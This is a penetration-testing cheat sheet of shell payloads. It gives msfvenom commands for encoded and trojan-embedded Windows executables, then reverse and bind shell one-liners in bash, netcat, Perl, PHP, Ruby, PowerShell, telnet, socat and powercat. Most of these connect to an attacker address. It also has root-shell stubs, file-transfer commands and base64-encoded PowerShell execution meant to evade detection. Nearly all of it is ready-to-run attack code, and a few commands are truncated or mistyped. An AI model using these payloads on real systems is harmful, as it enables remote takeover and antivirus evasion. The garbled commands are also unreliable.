# Shell creation with msfvenom
## Windows PE
```bash
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.6 LPORT=444 -f exe -o shell_reverse.exe
```
- Encoded (**-e** to specify encoder type and **-i** to setup the number of iterations)
	```bash
	msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
	```
	- This does not work with modern AVs.

- Inject a payload into an existing PE
	```bash
	msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windowsresources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
	```
# Shells & Reverse Shells

## **Shells & Reverse Shells**

-   bin/bash:
	```c
	int main(void){

	setresuid(0, 0, 0);

	system("/bin/bash");

	}
	```
	
-   bin/sh:
	```c
	int main(void){

	setresuid(0, 0, 0);

	system("/bin/sh");

	}
	```


## **TTY Shell:**

```sql
python -c 'import pty;pty.spawn("/bin/bash")'
```

```sql
echo os.system('/bin/bash')
```

-   LUA
	```sql
	execute('/bin/sh')
	```

-   Privilege Escalation via nmap
	```sql
	!sh
	```
	
-   Privilege Escalation via vi
	```sql
	:!bash
	```


## Fully Interactive TTY
```sql

						 	In reverse shell 
python -c 'import pty; pty.spawn("/bin/bash")'Ctrl-Z                                

						  	In Attacker console
stty -a
stty raw -echo
fg                            

							In reverse shell
resetexport SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>

```

```sql

						 	In reverse shell 
script /dev/null -c bash Ctrl-Z                                

						  	In Attacker console
stty raw -echo; fg                            

							In reverse shell
reset
Terminal type?: xterm 
export TERM=xterm
export shell=bash 
stty rows 52
```

## **Spawn Ruby Shell**
 
```sql
exec "/bin/sh"
```

```sql
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh-i<&%d >&%d 2>&%d",f,f,f)'
```


## **Netcat**

```sql
nc -e /bin/sh ATTACKING-IP 80
```

```sql
/bin/sh | nc ATTACKING-IP 80
```

```sql
rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
```

## **PowerShell**
### Reverse Shell
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();

```
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 ### Bind Shell
 ```powershell
 powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
 ```
	
	
## **Telnet Reverse Shell**

```sql
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
```

```sql
telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
```


## **PHP**
-   (Assumes TCP uses file descriptor 3. If it doesn’t work, try 4,5, or 6)
	```sql
	php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
	```


## **Bash**

```sql
exec /bin/bash 0&0 2>&0
```

```sql
0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
```

```sql
exec 5<>/dev/tcp/ATTACKING-IP/80 cat <&5 | while read line; do $line 2>&5 >&5; done
```

```sql
bash -i >& /dev/tcp/ATTACKING-IP/80 0>&
```

```sql
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f
```


## **Perl**

```perl
    exec "/bin/sh";
```

```sql
perl —e 'exec "/bin/sh";'
```

```sql
    perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
- Windows
	```sql
	perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
	```

- Windows
	```sql
	perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
	```
## **Socat**
- Reverse shell a través de proxy y encapsulada en SSL:
```bash
# Lado atacante
socat TCP-LISTEN:443 stdout

#Lado victima
proxy=your-company-proxy
cctrl=attacker_ip
socat TCP-LISTEN:44443,reuseaddr,fork,bind=127.0.0.1 PROXY:$proxy:$cctrl:443,proxyport=80
socat TCP-LISTEN:55522,reuseaddr,fork,bind=127.0.0.1 OPENSSL:127.0.0.1:44443,verify=0
```

## Socat

### Client
  ```bash
  socat - TCP4:>remote server's IP>:80
  ```
### Server
  ```bash
  sudo socat TCP4-LISTEN:443 STDOU
  ```
### Send a file
  ```bash
  sudo socat TCP4-LISTEN:443,fork file:pass.txt
  ```
  
### Receive a file
  ```bash
  sudo socat TCP4:<Server IP>:443 file:pass.txt,create
  ```
### Reverse Shell
  ```bash
  #Attacker's machine
  socat -d -d TCP4-LISTEN:443 STDOUT
  #The -d -d are used to add verbosity
  ```
  
  ```bash
  #Victim's machine
  socat TCP:<Attacker's IP>:443 EXEC:/bin/bash
  ```
  
  ### Encrypted Bind Shells
  We will use **openssl** to create a self-signed cert with the following options:
  * **req**
  * **-newkey**
  * **rsa:2048**
  * **-nodes**
  * **-keyout**
  * **-x309**
  * **-days**
  * **-out**
    ```bash
     openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out shell.crt
     ```
     ```bash
     cat shell.key shell.crt > shell.pem
     ```
     <br>
     
     ```bash
     #Victim's machine
     sudo socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork EXEC:/bin/bash
     ```
     ```bash
     #Attacker's machine
     socat - OPENSSL:<Victim's IP>:443,verify=0
     ```
     
## Powercat
Powercat can be installed in our Kali with *apt install powercat*, and the script will be placed in */usr/share/windows-resources/powercat*.

### File Transfers
```powershell
#Transmitter
powercat -c X.X.X.X -p 443 -i C:\Users\xonork\some_file.txt
```

### Reverse Shell
```powershell
#Victim's machine
powercat -c X.X.X.X -p 443 -e cmd.exe
```

### Bind Shell
```powershell
#Victim's machine
powercat -l -p 443 -e cmd.exe
```

### Stand-Alone Payloads
```powershell
#Victim's machine
powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverse.ps1
./reverse.ps1
#This script mightr be easily detected by IDS. It's very large, it has 300 lines of code and hardcoded strings that can be
#easily be used in signatures for malicious activity.
```

```powershell
#Victim's machine
powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge> encodedreverse.ps1
powershell.exe -E U2luIGNvbm9jaW1pZW50bywgbGEgaGFiaWxpZGFkIG5vIHNlIHB1ZWRlIGVuZm9jYXIuIFNpbiBoYWJpbGlkYWQsIGxhIGZ1ZXJ6YSBubyBwdWVkZSBzZXIgZWplcmNpZGEgeSBzaW4gZnVlcnphLCBlbCBjb25vY2ltaWVudG8gbm8gcHVlZGUgc2VyIGFwbGljYWRvLg==
#This way we profit the PowerShell's ability to execute base64 encoded code. The -E flags allow us to execute encoded commands.
```


